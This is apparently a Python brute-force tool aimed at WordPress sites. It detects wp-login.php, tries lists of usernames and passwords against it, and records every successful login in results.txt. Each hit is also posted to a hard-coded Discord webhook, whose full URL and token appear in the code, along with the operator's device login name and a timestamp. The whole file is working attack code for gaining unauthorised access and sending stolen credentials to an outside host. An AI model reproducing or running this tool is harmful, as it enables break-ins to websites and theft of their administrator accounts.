import requests
import json
import os
from urllib.parse import urlparse
from tools import colorprint
from tools import getwpusers
import datetime
hebele = 0
hebele2 = 0
def save(content):
    try:
        with open("results.txt", 'a') as f:  # dosya_adi adlı dosyayı aç ve yazma modunda aç
            f.write(content + "\n")  # veriyi dosyaya yaz ve bir alt satıra geç
    except IOError:  # dosya açılırken veya yazılırken bir hata oluşursa
        print("Dosya açılırken bir hata oluştu.")  # hata mesajı yazdır

def is_wordpress(url):
    try:
        response = requests.get(f"{url}/wp-login.php",timeout=15)
    except:
        return False
    if response.status_code == 200 and "wp-login.php" in response.url:
        return True
    else:
        return False


def dchook(mesaj):
    url = 'https://discord.com/api/webhooks/1088612387483025418/T8uMmlwvdo9QLc41aS_4-GtClgHIvP5S1J8_y8RSIByhv8uA6qEMGneQfCtwUIcCcDLp'
    message = mesaj

    data = {
        'content': message
    }

    response = requests.post(url, json=data)

def brute(url, username, password):
    login_url = f'{url}/wp-login.php'
    session = requests.session()

    cookies = {
        'wordpress_test_cookie':'WP+Cookie+check'
    }

    try:
        response = session.post(login_url, data={'log': username, 'pwd': password, 'redirect_to': '/wp-admin/', 'wp-submit': 'Log In', 'testcookie': 1},
                                cookies=cookies, timeout=15)
    except:
        return None
    if 'Blocked by login security setting' in response.text:
        return None
    elif 'wp-admin' in response.url:
        if('redirect_to' in response.url):
            return False
        colorprint.resultprint(f'{url}/wp-login.php {username}:{password} Giriş Başarılı!')
        try:
            dchook(f"{url}/wp-login.php {username}:{password} cihaz:{os.getlogin()} zaman:{datetime.datetime.now()} - Enistein")
        except:
            dchook(f"{url}/wp-login.php {username}:{password} cihaz:bulunamadı zaman:{datetime.datetime.now()} - Enistein")
        save(f'{url}/wp-login.php {username}:{password} Giriş Başarılı!')
        return True
    else:
        #colorprint.resultprint(f'{url}/wp-login.php {username}:{password} Giriş Başarısız!', "f")
        return False

def url2domain(url):
    parsed_url = urlparse(url)
    domain_with_protocol = parsed_url.scheme + "://" + parsed_url.netloc
    if(domain_with_protocol =="://"):
        colorprint.colorprint(f"{url} URL Protokolü bulunamadı. Otomatik http:// ekleniyor", "f")
        domain_with_protocol = "http://"+ parsed_url.netloc
    return domain_with_protocol

def fileread(url, usernames, passwords):
    global hebele, hebele2
    hebele +=1
    hebele2 +=1
    if(hebele ==1000):
        colorprint.colorprint(f"{hebele2} tane tarandı!")
        hebele = 0
    for username in usernames:
        username = username.replace('-','.')
        for password in passwords:
            _brute = brute(url,username,password)
            if(_brute == True or _brute == None):
                break
        if(_brute):
            break
